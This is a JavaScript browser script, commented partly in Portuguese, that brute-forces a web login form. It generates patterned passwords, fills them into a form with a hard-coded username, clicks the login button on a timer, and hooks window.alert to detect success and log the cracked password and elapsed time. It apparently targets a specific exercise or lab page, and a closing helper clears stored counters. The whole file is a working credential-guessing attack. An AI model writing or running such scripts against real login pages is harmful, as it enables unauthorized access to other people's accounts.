//função gerar senhas
var currentDigit1 = 0;
var currentDigit2 = 0;
var currentUppercaseLetter = 'A';
var currentLowercaseLetter = 'a';

function generatePassword() {
    let digit1Str = currentDigit1.toString().repeat(2);
    let digit2Str = currentDigit2.toString().repeat(2);
    let uppercaseStr = currentUppercaseLetter.repeat(2);
    let lowercaseStr = currentLowercaseLetter.repeat(2);
    let password = digit1Str + uppercaseStr + digit2Str + lowercaseStr + digit1Str;

    // Increment the letters and digits for the next password
    incrementCharacters();
    
    return password;
}

function incrementCharacters() {
    currentLowercaseLetter = nextLowercaseLetter(currentLowercaseLetter);
    if (currentLowercaseLetter === 'a') {
        currentUppercaseLetter = nextUppercaseLetter(currentUppercaseLetter);
        if (currentUppercaseLetter === 'A') {
            currentDigit2++;
            if (currentDigit2 > 9) {
                currentDigit2 = 0;
                currentDigit1++;
                if (currentDigit1 > 9) {
                    currentDigit1 = 0;
                }
            }
        }
    }
}

function nextUppercaseLetter(letter) {
    let charCode = letter.charCodeAt(0);

    if (charCode < 90) { // 'Z'
        charCode++;
    } else {
        charCode = 65; // 'A'
    }

    return String.fromCharCode(charCode);
}

function nextLowercaseLetter(letter) {
    let charCode = letter.charCodeAt(0);

    if (charCode < 122) { // 'z'
        charCode++;
    } else {
        charCode = 97; // 'a'
    }

    return String.fromCharCode(charCode);
}
// Função para testar senhas
function tryPassword() {
    let usernameField = document.getElementsByName('username')[0];
    let passwordField = document.getElementsByName('password')[0];

    usernameField.value = 'al68627';

    let startTime = new Date().getTime(); // Captura o tempo inicial

    // Override the alert function to detect when login is successful
    let originalAlert = window.alert;
    window.alert = function(message) {
        if (message === 'Login successful') {
            clearInterval(interval);
            let endTime = new Date().getTime(); // Captura o tempo final
            let timeTaken = endTime - startTime; // Calcula o tempo gasto em milissegundos

            // Converte o tempo para segundos e minutos
            let timeInSeconds = timeTaken / 1000;
            let minutes = Math.floor(timeInSeconds / 60);
            let seconds = timeInSeconds % 60;

            console.log('Login successful with password:', passwordField.value);
            console.log(`Time taken to crack the password: ${minutes} minutes and ${seconds.toFixed(3)} seconds`);

            // Restore the original alert function
            window.alert = originalAlert;
            originalAlert(message);
        } else {
            originalAlert(message);
        }
    };

    let interval = setInterval(() => {
        let password = generatePassword();
        passwordField.value = password;

        // Simula o clique no botão de envio
        //validateForm();
        document.getElementById("loginButton").click();
    }, 1000); // Ajusta o intervalo para 1 ms
}

// Iniciar o teste de senha
tryPassword();


//SCRIPT DE DAR CLEAR NO LOCALSTORAGE
function clearCharacterStorage() {
    // List of storage keys to clear
    const keysToClear = ['currentDigit1', 'currentDigit2', 'currentUppercaseLetter', 'currentLowercaseLetter'];

    // Clear each key from local storage
    keysToClear.forEach(key => {
        localStorage.removeItem(key);
    });

    console.log('Character storage cleared!');
}

// Execute the storage clearing function
clearCharacterStorage();